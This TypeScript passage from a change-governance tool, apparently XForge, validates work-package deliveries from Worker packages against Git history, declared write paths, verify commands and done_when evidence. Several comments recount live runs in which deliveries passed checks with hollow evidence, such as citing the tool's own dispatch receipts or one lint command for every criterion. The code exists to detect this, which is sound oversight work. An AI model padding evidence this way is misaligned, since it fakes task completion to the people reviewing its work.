 * A commit that writes anywhere else is, by construction, work nobody declared, and naming it here
 * — with both commits — is what keeps this from surfacing as a mysterious write escape.
 */
async function validateDeliveryHead(
  project: ProjectContext,
  changeId: string,
  workPackage: WorkPackage,
  headCommit: string,
  sourcePath: string,
  context: DeliveryContext,
): Promise<{ diagnostics: Diagnostic[]; unattributed: string[] }> {
  const { repositoryHead } = context;
  /* No observed HEAD means Git itself was unusable, which `resolveWorkPackages` already reported as
     XFORGE_WORK_PACKAGE_GIT_REQUIRED. Repeating it per delivery would only add noise. */
  if (!repositoryHead || headCommit === repositoryHead) return { diagnostics: [], unattributed: [] };

  const reachable = await git(project.root, ['merge-base', '--is-ancestor', headCommit, repositoryHead]);
  if (reachable.code !== 0) {
    /* A head that is not an ancestor of HEAD is not in this worktree's history at all: an abandoned
       branch, a rebased-away commit, or a range invented wholesale. Nothing it claims is checkable
       against the tree everyone else will read. This one really is the package's problem — it is
       *this* delivery's declared range that does not exist — so it stays a per-package error. */
    return {
      diagnostics: [diagnostic(
        'XFORGE_WORK_PACKAGE_HEAD_NOT_CURRENT',
        `Work package ${workPackage.id} declares head_commit ${headCommit}, which is not an ancestor of the repository HEAD ${repositoryHead}. A delivery must be judged against the history the repository actually has.`,
        sourcePath,
        'error',
        { packageId: workPackage.id, headCommit, repositoryHead },
      )],
      unattributed: [],
    };
  }

  const beyond = await git(project.root, ['diff', '--name-only', '--no-renames', '-z', `${headCommit}..${repositoryHead}`, '--']);
  if (beyond.code !== 0) {
    return {
      diagnostics: [diagnostic('XFORGE_WORK_PACKAGE_GIT_DIFF_FAILED', 'Unable to resolve the commits between the delivery head and HEAD.', sourcePath, 'error', { stderr: beyond.stderr.trim() })],
      unattributed: [],
    };
  }
  const changeRoot = `${project.changesPath}/${changeId}`;
  const unattributed: string[] = [];
  for (const item of beyond.stdout.split('\0').filter(Boolean)) {
    let changed: string;
    try { changed = normalizeRelative(item, 'Git changed path'); } catch { unattributed.push(item); continue; }
    if (isControlPlaneBookkeeping(changed, changeRoot)) continue;
    if (context.attributablePaths.some((pattern) => matchesPattern(changed, pattern))) continue;
    unattributed.push(changed);
  }
  /*
   * Returned rather than reported here, because the finding is not about this package.
   *
   * The condition is "the tree contains work nobody declared", and it is discovered while checking a
   * delivery only because a delivery is what gives us a commit to measure from. Reporting it as a
   * per-delivery error made three independently correct packages read as
   * `work-package:wp-a:failed, work-package:wp-b:failed, work-package:wp-c:failed` — the same tree
   * condition, restated once per package, blamed on all of them. Nothing about any of those packages
   * needs fixing; the plan's declarations do. `resolveWorkPackages` aggregates these into one
   * finding, and the control plane blocks the transition on `tree:unattributed-paths`.
   */
  return { diagnostics: [], unattributed };
}

async function validateSuccessfulDelivery(
  project: ProjectContext,
  changeId: string,
  workPackage: WorkPackage,
  delivery: WorkPackageDelivery,
  sourcePath: string,
  context: DeliveryContext,
): Promise<{ diagnostics: Diagnostic[]; unattributed: string[] }> {
  const diagnostics: Diagnostic[] = [];
  const unattributed: string[] = [];
  if (project.manifest.apiVersion === 'xforge.dev/v1alpha2') {
    if (!delivery.state_revision || !delivery.policy_snapshot_digest || !delivery.audit_correlation_id) {
      diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DISPATCH_BINDING_REQUIRED', 'Protocol 2 delivery requires state_revision, policy_snapshot_digest, and audit_correlation_id.', sourcePath));
    } else {
      const dispatchPath = `${project.changesPath}/${changeId}/evidence/agents/${workPackage.id}/dispatch/${delivery.execution_id}.json`;
      try {
        const dispatch = JSON.parse(await readFile(await safeResolve(project.root, dispatchPath), 'utf8')) as WorkPackageDispatchReceipt;
        const schemaDiagnostics = await validateSchema('work-package-dispatch', dispatch, dispatchPath);
        diagnostics.push(...schemaDiagnostics);
        const { digest, ...unsigned } = dispatch;
        if (digest !== sha256(stableStringify(unsigned))) diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DISPATCH_DIGEST_INVALID', 'Work package dispatch receipt digest is invalid.', dispatchPath));
        if (dispatch.change !== changeId || dispatch.packageId !== workPackage.id || dispatch.executionId !== delivery.execution_id ||
          dispatch.stateRevision !== delivery.state_revision || dispatch.policySnapshotDigest !== delivery.policy_snapshot_digest || dispatch.auditCorrelationId !== delivery.audit_correlation_id) {
          diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DISPATCH_MISMATCH', 'Delivery does not match its dispatch receipt.', sourcePath));
        }
        /*
         * `base_commit` must be a commit that already contains the dispatch receipt.
         *
         * Dispatching writes the receipt and the audit index, and those writes are committed after
         * `xforge work-package dispatch` returns. A worker that takes `base_commit` from the HEAD
         * the dispatch receipt recorded therefore starts one commit too early, and the control
         * plane's own bookkeeping lands inside `base..head` — where it is indistinguishable from
         * the worker's output and trips the write_paths check for a reason the worker did not
         * cause. Requiring the receipt to be present at `base_commit` pins the start of the work
         * to the commit that dispatched it.
         */
        if (delivery.base_commit && delivery.head_commit) {
          const atHead = await git(project.root, ['cat-file', '-e', `${delivery.head_commit}:${dispatchPath}`]);
          const atBase = await git(project.root, ['cat-file', '-e', `${delivery.base_commit}:${dispatchPath}`]);
          /* An untracked receipt cannot land in the diff, so only the committed-after-base case is wrong. */
          if (atHead.code === 0 && atBase.code !== 0) {
            diagnostics.push(diagnostic(
              'XFORGE_WORK_PACKAGE_BASE_PRECEDES_DISPATCH',
              `base_commit ${delivery.base_commit} predates the commit that introduced the dispatch receipt, so the control plane's own writes fall inside the delivery diff. Start the work package from the commit that contains the receipt.`,
              sourcePath,
              'error',
              { baseCommit: delivery.base_commit, dispatchPath },
            ));
          }
        }
      } catch (error) {
        diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DISPATCH_MISSING', `Dispatch receipt is missing or invalid: ${(error as Error).message}`, dispatchPath));
      }
    }
  }
  if (!delivery.head_commit) {
    diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_HEAD_REQUIRED', 'A succeeded delivery requires head_commit.', sourcePath));
    return { diagnostics, unattributed };
  }
  if (delivery.changed_paths.length === 0) {
    diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_EMPTY_DELIVERY', 'A succeeded write package must contain at least one changed path.', sourcePath));
  }

  const ancestry = await git(project.root, ['merge-base', '--is-ancestor', delivery.base_commit, delivery.head_commit]);
  if (ancestry.code !== 0) {
    diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_COMMIT_ANCESTRY', 'head_commit must descend from base_commit.', sourcePath, 'error', { stderr: ancestry.stderr.trim() }));
    return { diagnostics, unattributed };
  }
  const head = await validateDeliveryHead(project, changeId, workPackage, delivery.head_commit, sourcePath, context);
  diagnostics.push(...head.diagnostics);
  unattributed.push(...head.unattributed);
  const diff = await git(project.root, ['diff', '--name-only', '--no-renames', '-z', `${delivery.base_commit}...${delivery.head_commit}`, '--']);
  if (diff.code !== 0) {
    diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_GIT_DIFF_FAILED', 'Unable to resolve the delivery commit diff.', sourcePath, 'error', { stderr: diff.stderr.trim() }));
    return { diagnostics, unattributed };
  }
  const actualPaths = diff.stdout.split('\0').filter(Boolean).map((item) => normalizeRelative(item, 'Git changed path')).sort();
  const declaredPaths = [...delivery.changed_paths].map((item) => normalizeRelative(item, 'Delivery changed path')).sort();
  if (JSON.stringify(actualPaths) !== JSON.stringify(declaredPaths)) {
    diagnostics.push(diagnostic(
      'XFORGE_WORK_PACKAGE_CHANGED_PATHS_MISMATCH',
      'Delivery changed_paths does not match the Git diff.',
      sourcePath,
      'error',
      { declared: declaredPaths, actual: actualPaths },
    ));
  }
  const changeRoot = `${project.changesPath}/${changeId}`;
  for (const changed of actualPaths) {
    /*
     * A control-plane bookkeeping path (dispatch receipts, the audit index) can land inside
     * `base..head` for reasons that have nothing to do with what the Worker wrote — e.g. a
     * concurrent `xforge` invocation appending to the audit index mid-delivery. The
     * `base_commit`-precedes-dispatch check above only catches the case where XForge's own
     * dispatch commit is the cause; it doesn't help when some other bookkeeping write is swept
     * into the range. Since these paths are never attributable to the Worker either way, they're
     * exempted from write_paths here too, on the same reasoning.
     */
    if (isControlPlaneBookkeeping(changed, changeRoot)) continue;
    if (!workPackage.write_paths.some((pattern) => matchesPattern(changed, pattern))) {
      diagnostics.push(diagnostic(
        'XFORGE_WORK_PACKAGE_WRITE_ESCAPE',
        `Work package ${workPackage.id} changed a path outside write_paths: ${changed}`,
        sourcePath,
      ));
    }
  }
  /*
   * A delivery whose entire diff is the control plane's own bookkeeping delivered nothing. The
   * write_paths check alone did not catch it: bookkeeping that happens to sit under a declared
   * write path would have passed, and every remaining check on a delivery is self-reported.
   */
  if (actualPaths.length > 0 && actualPaths.every((item) => isControlPlaneBookkeeping(item, changeRoot))) {
    diagnostics.push(diagnostic(
      'XFORGE_WORK_PACKAGE_NO_WORK_DELIVERED',
      `Work package ${workPackage.id} reports success but changed only XForge's own dispatch and audit bookkeeping. A succeeded delivery must change something the package was asked to write.`,
      sourcePath,
      'error',
      { changedPaths: actualPaths },
    ));
  }

  const commands = delivery.validation.map((item) => item.command);
  /* Still an exact, ordered match against the declared list; only the rendering of an argv entry is
     allowed to vary (see NormalizedVerify.accepted), because the delivery schema records a string. */
  const validationMatches = commands.length === context.verify.length
    && context.verify.every((entry, index) => entry.accepted.includes(commands[index]!));
  if (!validationMatches) {
    diagnostics.push(diagnostic(
      'XFORGE_WORK_PACKAGE_VALIDATION_MISMATCH',
      'Delivery validation commands must exactly match verify.',
      sourcePath,
      'error',
      { declared: context.verify.map((entry) => entry.label), recorded: commands },
    ));
  }
  if (delivery.validation.some((item) => item.exit_code !== 0)) {
    diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_VALIDATION_FAILED', 'A succeeded delivery cannot contain a failed validation result.', sourcePath));
  }
  const mappings = delivery.done_when_evidence ?? [];
  const mapped = new Map<string, number>();
  for (const mapping of mappings) mapped.set(mapping.criterion, (mapped.get(mapping.criterion) ?? 0) + 1);
  for (const criterion of workPackage.done_when) {
    const count = mapped.get(criterion) ?? 0;
    if (count === 0) diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DONE_WHEN_EVIDENCE_MISSING', `No evidence mapping was supplied for done_when criterion: ${criterion}`, sourcePath));
    if (count > 1) diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DONE_WHEN_EVIDENCE_DUPLICATE', `done_when criterion is mapped more than once: ${criterion}`, sourcePath));
  }
  /*
   * Evidence used to be counted, never judged. A live run mapped every criterion to the dispatch
   * receipt and the audit index — files XForge wrote itself — and the mapping was accepted, so
   * "npm test exits 0" was evidenced by the fact that the package had been dispatched. An entry
   * now has to be either a command the package actually ran or a path the delivery actually
   * changed; the control plane's own writes count as neither.
   */
  const ranCommands = new Set(delivery.validation.map((item) => item.command));
  const changedSet = new Set(actualPaths);
  const matched = new Map<string, string[]>();
  for (const mapping of mappings) {
    const relevant = (mapping.evidence ?? []).filter((item) => {
      const reference = evidenceReference(item);
      if (ranCommands.has(reference)) return true;
      const candidates = [reference, evidenceReferenceWithoutLine(reference)].filter((value): value is string => value !== null);
      return candidates.some((candidate) => {
        let normalized: string;
        try { normalized = normalizeRelative(candidate, 'Evidence path'); } catch { return false; }
        return changedSet.has(normalized) && !isControlPlaneBookkeeping(normalized, changeRoot);
      });
    });
    if (relevant.length === 0) {
      diagnostics.push(diagnostic(
        'XFORGE_WORK_PACKAGE_DONE_WHEN_EVIDENCE_IRRELEVANT',
        `No evidence for done_when criterion "${mapping.criterion}" names a verify command this delivery ran or a path it changed. An entry must begin with the exact command or path; an explanation may follow after an em dash or " -- ", and a trailing :line or :line-line is ignored. Only the reference before the dash is matched, so a test name or a sentence of prose matches nothing.`,
        sourcePath,
        'error',
        { criterion: mapping.criterion, evidence: mapping.evidence ?? [] },
      ));
      continue;
    }
    matched.set(mapping.criterion, relevant.map(evidenceReference));
  }
  /*
   * Whether a citation actually supports the conclusion it is filed under is a semantic question,
   * and this function cannot answer it — the same honest limit `check-findings` states about its
   * own `refs`. What is decidable is whether the evidence *discriminates*: a live run mapped six
   * different criteria, including "a failed cross-aggregate write leaves nothing queryable", to the
   * single command `cargo clippy -- -D warnings`, which supports none of them. One reference
   * standing for every criterion in a delivery cannot be telling them apart, whatever it says.
   *
   * Reported as a warning rather than an error, because two genuinely related criteria evidenced by
   * one test command is normal and this cannot distinguish that from padding. Naming it is the
   * point: the previous behaviour was silence.
   */
  if (matched.size > 1) {
    const shared = [...matched.values()].reduce<string[] | null>(
      (common, references) => (common === null ? references : common.filter((item) => references.includes(item))),
      null,
    ) ?? [];
    if (shared.length > 0 && [...matched.values()].every((references) => references.length === shared.length)) {
      diagnostics.push(diagnostic(
        'XFORGE_WORK_PACKAGE_DONE_WHEN_EVIDENCE_UNDISCRIMINATING',
        `Every one of the ${matched.size} mapped done_when criteria is evidenced by exactly the same reference(s): ${shared.join(', ')}. Evidence that is identical for every criterion cannot be distinguishing between them; cite what establishes each one specifically.`,
        sourcePath,
        'warning',
        { criteria: [...matched.keys()], shared },
      ));
    }
  }
  for (const mapping of mappings) {
    if (!workPackage.done_when.includes(mapping.criterion)) {
      diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DONE_WHEN_EVIDENCE_UNKNOWN', `Evidence maps an unknown done_when criterion: ${mapping.criterion}`, sourcePath));
    }
  }
  return { diagnostics, unattributed };
}

export interface ResolveWorkPackagesOptions {
  requireDeliveries?: boolean;
}

/**
 * The outcome of asking a Change for its work-package plan, with the reason no plan came back.
 *
 * `state: null` used to carry three different facts at once — the Change has no plan, the plan is
 * there but unreadable, and nobody resolved the plan at all — and every consumer that had to tell
 * them apart guessed. Two defects came out of that single conflation: `checker` told a Change whose
 * YAML failed to parse that it was "delivering without work-packages.yaml, which is a permitted
 * shape", and the archive path judged `independentReview` against a plan it had never loaded and
 * refused every Major Change that used one. Naming the reason is what makes both undecidable
 * questions decidable.
 *
 * `unresolved` is not a member: a value of this type only exists because someone resolved. That
 * case is expressed by the absence of the value, which the type system can see.
 */
export interface WorkPackageResolution {
  /** `absent`: no plan file. `unusable`: a plan that failed to parse or validate. `resolved`: a plan. */
  status: 'absent' | 'unusable' | 'resolved';
  state: WorkPackagePlanState | null;
  diagnostics: Diagnostic[];
}

export async function resolveWorkPackages(
  project: ProjectContext,
  changeId: string,
  config: ChangeConfig,
  resources: SelectedResources,
  options: ResolveWorkPackagesOptions = {},
): Promise<WorkPackageResolution> {
  const planPath = `${project.changesPath}/${changeId}/work-packages.yaml`;
  const absolutePlanPath = await safeResolve(project.root, planPath);
  if (!await exists(absolutePlanPath)) return { status: 'absent', state: null, diagnostics: [] };

  let plan: WorkPackagePlan;
  try {
    plan = await loadYaml<WorkPackagePlan>(absolutePlanPath, planPath);
  } catch (error) {
    const diagnostics: Diagnostic[] = [];
    appendErrorDiagnostics(diagnostics, error);
    return { status: 'unusable', state: null, diagnostics };
  }
  const diagnostics = await validateSchema('work-package', plan, planPath);
  if (diagnostics.some((item) => item.severity === 'error')) return { status: 'unusable', state: null, diagnostics };

  const ids = plan.packages.map((item) => item.id);
  const uniqueIds = new Set(ids);
  if (uniqueIds.size !== ids.length) diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DUPLICATE', 'Work package IDs must be unique.', planPath));
  const byId = new Map(plan.packages.map((item) => [item.id, item]));

  for (const workPackage of plan.packages) {
    for (const dependency of workPackage.depends_on) {
      if (!uniqueIds.has(dependency)) diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DEPENDENCY_UNKNOWN', `Work package ${workPackage.id} depends on unknown package ${dependency}.`, planPath));
      if (dependency === workPackage.id) diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DEPENDENCY_CYCLE', `Work package ${workPackage.id} depends on itself.`, planPath));
    }
  }
  for (const id of ids) {
    if (dependsTransitively(byId, id, id)) diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DEPENDENCY_CYCLE', `Work package DAG contains a cycle at ${id}.`, planPath));
  }

  const integratorPaths = plan.integrator_paths ?? [];
  const protectedPaths = protectedWritePaths(project, changeId, config, resources, integratorPaths);
  /*
   * The governance surface on its own — everything `protectedWritePaths` reserves *except* what this
   * plan reserved for its own Integrator. No package of any role may write these. The integrator
   * package is exempt from the `integrator_paths` half of the set and from nothing else: it delivers
   * the assembly, not the Constitution, the Specs, the lock, or the Change's own Evidence.
   */
  const governancePaths = protectedWritePaths(project, changeId, config, resources, []);
  const integratorPackages = plan.packages.filter(isIntegratorPackage);
  if (integratorPackages.length > 1) {
    diagnostics.push(diagnostic(
      'XFORGE_WORK_PACKAGE_INTEGRATOR_DUPLICATE',
      `A plan may declare at most one role: integrator package; this one declares ${integratorPackages.length}: ${integratorPackages.map((item) => item.id).join(', ')}. Integration is the point where the packages become one thing, so two of them are two writers of the same assembly.`,
      planPath,
      'error',
      { packageIds: integratorPackages.map((item) => item.id) },
    ));
  }
  /*
   * Assembly the DAG cannot see is assembly the DAG will report as done.
   *
   * `integrator_paths` alone fixed attribution: it gave the shared surface a unique writer, so a file
   * created during integration stopped invalidating every delivery in the plan. It did not make the
   * assembly a *node*. A live run finished three worker packages, every one `succeeded`, and the
   * control plane reported the Apply transition ready with all Gates green — while the assembly root
   * was still empty and eight of eleven Requirements were unimplemented. Nothing was wrong: no
   * artifact in the plan had ever claimed that the assembly was owed, so nothing could be missing.
   *
   * Declaring a path for the Integrator is that claim, made halfway. This completes it: reserve the
   * surface and you must also name the package that delivers it, which then carries `depends_on`,
   * `verify` and `done_when` like any other and blocks the transition until it has a delivery.
   */
  if (integratorPaths.length > 0 && integratorPackages.length === 0) {
    diagnostics.push(diagnostic(
      'XFORGE_WORK_PACKAGE_INTEGRATOR_UNTRACKED',
      `The plan reserves ${integratorPaths.length} path(s) for the Integrator (${integratorPaths.join(', ')}) but declares no package with role: integrator, so the assembly that writes them is not in the DAG. Every worker package can then succeed and the Apply transition report ready with nothing assembled. Add one package with role: integrator whose write_paths fall inside integrator_paths, depending on the packages it assembles.`,
      planPath,
      'error',
      { integratorPaths },
    ));
  }
  for (const rule of resources.rules.values()) {
    if (rule.value.spec.writePolicy === 'integrator-only' && !rule.value.spec.paths?.length) {
      diagnostics.push(diagnostic('XFORGE_RULE_WRITE_POLICY_PATHS_REQUIRED', 'An integrator-only Rule must declare paths.', rule.yamlPath));
    }
  }

  for (const workPackage of plan.packages) {
    for (const input of workPackage.inputs) {
      try {
        const normalized = normalizeRelative(input, `Work package ${workPackage.id} input`);
        const absolute = await safeResolve(project.root, normalized);
        if (!await exists(absolute) || !(await stat(absolute)).isFile()) {
          diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_INPUT_MISSING', `Required input is missing or is not a file: ${normalized}`, planPath));
        }
      } catch (error) {
        appendErrorDiagnostics(diagnostics, error);
      }
    }
    for (const skill of workPackage.skills) {
      if (!resources.skills.has(skill)) diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_SKILL_MISSING', `Work package ${workPackage.id} requires unavailable Skill ${skill}.`, planPath));
    }
    /*
     * Verify entries are checked here, in the structural pass, and not where they are turned into
     * Gates. `commands/check.ts` runs work-package verifications only when the structural pass
     * produced no errors, so an entry rejected below can never reach a spawn — the refusal is a
     * precondition of execution rather than a check performed alongside it.
     */
    for (const entry of normalizeVerify(workPackage)) {
      if (entry.problem) {
        diagnostics.push(diagnostic(
          'XFORGE_WORK_PACKAGE_VERIFY_UNSAFE',
          `Work package ${workPackage.id} has a verify command that cannot be run without a shell: it ${entry.problem}. Rewrite it as an argv array, e.g. verify: [["npm", "test"]]; XForge runs verify commands directly and never through /bin/sh, so a command line cannot compose, redirect, or substitute.`,
          planPath,
          'error',
          { packageId: workPackage.id, verify: entry.label },
        ));
        continue;
      }
      if (entry.legacy) {
        diagnostics.push(diagnostic(
          'XFORGE_WORK_PACKAGE_VERIFY_LEGACY_STRING',
          `Work package ${workPackage.id} declares verify as a single string, which is deprecated and will be removed. Replace it with the argv array XForge will actually run: ${JSON.stringify(entry.argv)}.`,
          planPath,
          'warning',
          { packageId: workPackage.id, verify: entry.label, argv: entry.argv },
        ));
      }
    }
    for (const patternInput of workPackage.write_paths) {
      try {
        /*
         * A trailing slash reads as "this directory" and matches nothing, because `matchesPattern`
         * compares against file paths. The plan validated, `xforge state` reported no diagnostic,
         * and every package dispatched — the first sign of trouble was
         * XFORGE_WORK_PACKAGE_WRITE_ESCAPE at delivery time, with the code already written and
         * committed. Rejecting it here costs a one-character edit; catching it there cost a real
         * project seven re-declared packages.
         */
        if (/\/$/.test(patternInput.trim())) {
          diagnostics.push(diagnostic(
            'XFORGE_WORK_PACKAGE_WRITE_PATH_DIRECTORY',
            `Work package ${workPackage.id} write path ends with a slash: ${patternInput}. A write path matches files, so this matches nothing — write ${patternInput.trim().replace(/\/+$/, '')}/** to mean everything under it.`,
            planPath,
            'error',
            { packageId: workPackage.id, pattern: patternInput },
          ));
          continue;
        }
        const pattern = normalizeRelative(patternInput, `Work package ${workPackage.id} write path`);
        if (UNSUPPORTED_GLOB_MAGIC.test(pattern)) {
          diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_GLOB_UNSUPPORTED', 'write_paths supports literal paths, * and ** only.', planPath, 'error', { pattern }));
          continue;
        }
        const prefix = staticPrefix(pattern);
        if (prefix === '.') {
          diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_WRITE_TOO_BROAD', `Work package ${workPackage.id} write path is too broad: ${pattern}`, planPath));
          continue;
        }
        await safeResolve(project.root, prefix);
        if (!config.scope.paths.some((scope) => patternWithinScope(pattern, normalizeRelative(scope, 'Change scope path')))) {
          diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_OUTSIDE_CHANGE_SCOPE', `Work package ${workPackage.id} write path is outside Change scope: ${pattern}`, planPath));
        }
        /*
         * The integrator package's boundary is `integrator_paths`, and it is a boundary in both
         * directions: it may write the reserved surface (the exemption below), and it may write
         * nothing else. Without the second half, "role: integrator" would read as a licence to write
         * anywhere, and the plan would have named an integrator to satisfy the rule above while
         * actually delivering ordinary work no reviewer expected to find there.
         */
        if (isIntegratorPackage(workPackage)) {
          if (!integratorPaths.some((declared) => patternWithinScope(pattern, normalizeRelative(declared, 'Integrator path')))) {
            diagnostics.push(diagnostic(
              'XFORGE_WORK_PACKAGE_INTEGRATOR_WRITE_UNRESERVED',
              `Integrator package ${workPackage.id} declares write path ${pattern}, which no integrator_paths entry covers. An integrator package delivers the reserved assembly surface and only that; anything else it needs to write belongs to a worker package, or must be reserved in integrator_paths first.`,
              planPath,
              'error',
              { packageId: workPackage.id, pattern, integratorPaths },
            ));
          }
          for (const governancePath of governancePaths) {
            const normalizedGovernance = normalizeRelative(governancePath, 'Protected write path');
            if (patternsPotentiallyOverlap(pattern, normalizedGovernance)) {
              diagnostics.push(diagnostic(
                'XFORGE_WORK_PACKAGE_SHARED_WRITE',
                `Integrator package ${workPackage.id} write path overlaps a governance path no package may write: ${governancePath}`,
                planPath,
              ));
            }
          }
          continue;
        }
        for (const protectedPath of protectedPaths) {
          const normalizedProtected = normalizeRelative(protectedPath, 'Protected write path');
          if (patternsPotentiallyOverlap(pattern, normalizedProtected)) {
            diagnostics.push(diagnostic(
              'XFORGE_WORK_PACKAGE_SHARED_WRITE',
              `Work package ${workPackage.id} write path overlaps an Integrator-only path: ${protectedPath}`,
              planPath,
            ));
          }
        }
      } catch (error) {
        appendErrorDiagnostics(diagnostics, error);
      }
    }
  }

  for (let leftIndex = 0; leftIndex < plan.packages.length; leftIndex += 1) {
    const left = plan.packages[leftIndex]!;
    for (let rightIndex = leftIndex + 1; rightIndex < plan.packages.length; rightIndex += 1) {
      const right = plan.packages[rightIndex]!;
      if (dependsTransitively(byId, left.id, right.id) || dependsTransitively(byId, right.id, left.id)) continue;
      for (const leftPath of left.write_paths) {
        for (const rightPath of right.write_paths) {
          if (patternsPotentiallyOverlap(leftPath, rightPath)) {
            diagnostics.push(diagnostic(
              'XFORGE_WORK_PACKAGE_PARALLEL_WRITE_CONFLICT',
              `Dependency-independent work packages ${left.id} and ${right.id} have potentially overlapping write paths.`,
              planPath,
              'error',
              { left: leftPath, right: rightPath },
            ));
          }
        }
      }
    }
  }

  const gitRoot = await git(project.root, ['rev-parse', '--show-toplevel']);
  let baseCommit: string | null = null;
  const resolvedGitRoot = gitRoot.code === 0 ? await realpath(gitRoot.stdout.trim()).catch(() => '') : '';
  const resolvedProjectRoot = await realpath(project.root).catch(() => path.resolve(project.root));
  if (gitRoot.code !== 0 || resolvedGitRoot !== resolvedProjectRoot) {
    diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_GIT_REQUIRED', 'Work package execution requires the XForge project root to be a Git worktree.', planPath));
  } else {
    const head = await git(project.root, ['rev-parse', 'HEAD']);
    if (head.code === 0 && /^[0-9a-fA-F]{40}$/.test(head.stdout.trim())) baseCommit = head.stdout.trim();
    else diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_GIT_REQUIRED', 'Work package execution requires a valid Git HEAD commit.', planPath));
  }

  const loadedDeliveries = await loadDeliveries(project, changeId, uniqueIds);
  diagnostics.push(...loadedDeliveries.diagnostics);
  const loadedDispatches = await loadDispatches(project, changeId, uniqueIds);
  diagnostics.push(...loadedDispatches.diagnostics);
  const ackAttestations = await readAcknowledgementAttestations(project, changeId);
  const loadedAckReceipts = await loadAckReceipts(project, changeId, uniqueIds, loadedDeliveries.deliveries, ackAttestations);
  diagnostics.push(...loadedAckReceipts.diagnostics);
  const auditEvents = (await readAuditEvents(project)).filter((event) => event.change === changeId && event.outcome === 'succeeded');
  const latestByPackage = new Map<string, WorkPackageDelivery | null>();
  const invalidDeliveries = new Set<string>();
  /*
   * Everything a commit is allowed to touch without being anybody's undeclared work: what some
   * package in this plan said it would write, plus the Integrator-only surfaces no package is
   * permitted to declare. `validateDeliveryHead` explains why the remainder between a delivery's
   * head and HEAD is measured against this union rather than against one package's write_paths.
   */
  const attributablePaths = [...new Set([...protectedPaths, ...plan.packages.flatMap((item) => item.write_paths)]
    .flatMap((pattern) => {
      /* A pattern that cannot be normalized was already diagnosed by the write_paths pass above;
         dropping it here only makes this check stricter, never more permissive. */
      try { return [normalizeRelative(pattern, 'Attributable write path')]; } catch { return []; }
    }))];
  const unattributedPaths = new Set<string>();
  for (const workPackage of plan.packages) {
    const latest = latestDelivery(loadedDeliveries.deliveries.get(workPackage.id));
    latestByPackage.set(workPackage.id, latest);
    if (!latest || latest.status !== 'succeeded') continue;
    const deliveryPath = `${project.changesPath}/${changeId}/evidence/agents/${workPackage.id}/${latest.execution_id}.yaml`;
    const delivered = await validateSuccessfulDelivery(project, changeId, workPackage, latest, deliveryPath, {
      repositoryHead: baseCommit,
      attributablePaths,
      verify: normalizeVerify(workPackage),
    });
    diagnostics.push(...delivered.diagnostics);
    for (const item of delivered.unattributed) unattributedPaths.add(item);
    if (delivered.diagnostics.some((item) => item.severity === 'error')) invalidDeliveries.add(workPackage.id);
  }
  /*
   * One finding for one condition. Every succeeded delivery measures the remainder between its own
   * head and HEAD against the same plan-wide attributable set, so the same undeclared file is
   * discovered by every delivery that precedes it — which is how a single unattributed directory
   * came out as three separate package failures naming three packages that were fine.
   *
   * The check itself was right and stays: without it a change nobody claimed can sit between two
   * accepted deliveries and reach Verify unexamined. Only the attribution of the finding moves —
   * from the packages, which cannot fix it, to the plan, which can.
   */
  if (unattributedPaths.size > 0) {
    const paths = [...unattributedPaths].sort();
    diagnostics.push(diagnostic(
      'XFORGE_WORK_PACKAGE_TREE_UNATTRIBUTED',
      `${paths.length} path(s) changed after a delivery that no work package declares and no Integrator-only path covers: ${paths.join(', ')}. A delivery is checked against the tree, not only against the commit range it names, so this blocks the Change without any package being at fault. Declare these paths — in the write_paths of the package that produced them, or in the plan's integrator_paths if they are assembly output — and re-record the affected deliveries.`,
      planPath,
      'error',
      { unattributed: paths },
    ));
  }

  for (const workPackage of plan.packages) {
    const delivery = latestByPackage.get(workPackage.id);
    if (!delivery || delivery.status !== 'succeeded' || invalidDeliveries.has(workPackage.id)) continue;
    for (const dependency of workPackage.depends_on) {
      const dependencyDelivery = latestByPackage.get(dependency);
      if (!dependencyDelivery || dependencyDelivery.status !== 'succeeded' || !dependencyDelivery.head_commit) continue;
      const ancestry = await git(project.root, ['merge-base', '--is-ancestor', dependencyDelivery.head_commit, delivery.base_commit]);
      if (ancestry.code !== 0) {
        const deliveryPath = `${project.changesPath}/${changeId}/evidence/agents/${workPackage.id}/${delivery.execution_id}.yaml`;
        diagnostics.push(diagnostic(
          'XFORGE_WORK_PACKAGE_DEPENDENCY_COMMIT_MISSING',
          `Work package ${workPackage.id} base_commit does not contain dependency ${dependency}.`,
          deliveryPath,
        ));
        invalidDeliveries.add(workPackage.id);
      }
    }
  }

  const packageStates: WorkPackageState[] = plan.packages.map((workPackage) => {
    const delivery = latestByPackage.get(workPackage.id) ?? null;
    const dispatch = latestDispatch(loadedDispatches.dispatches.get(workPackage.id));
    const missingDependencies = workPackage.depends_on.filter((dependency) => {
      const dependencyDelivery = latestByPackage.get(dependency);
      return !dependencyDelivery || dependencyDelivery.status !== 'succeeded' || invalidDeliveries.has(dependency);
    });
    let status: WorkPackageState['status'];
    let acknowledgements: WorkPackageState['acknowledgements'] = { reviewedBy: null, integratedBy: null };
    if (delivery?.status === 'succeeded' && !invalidDeliveries.has(workPackage.id)) {
      const lifecycle = auditEvents.filter((event) => event.workPackage === workPackage.id
        && (!delivery.audit_correlation_id || event.correlationId === delivery.audit_correlation_id));
      /*
       * A Git-tracked ack receipt for the currently latest delivery carries the lifecycle status on
       * a fresh clone, where no local `.audit/` history exists to carry it. Only attested receipts
       * reach this point (`loadAckReceipts` drops the rest), so a hand-written receipt cannot mint a
       * status here. When only the audit event exists — an ack recorded before receipts shipped, so
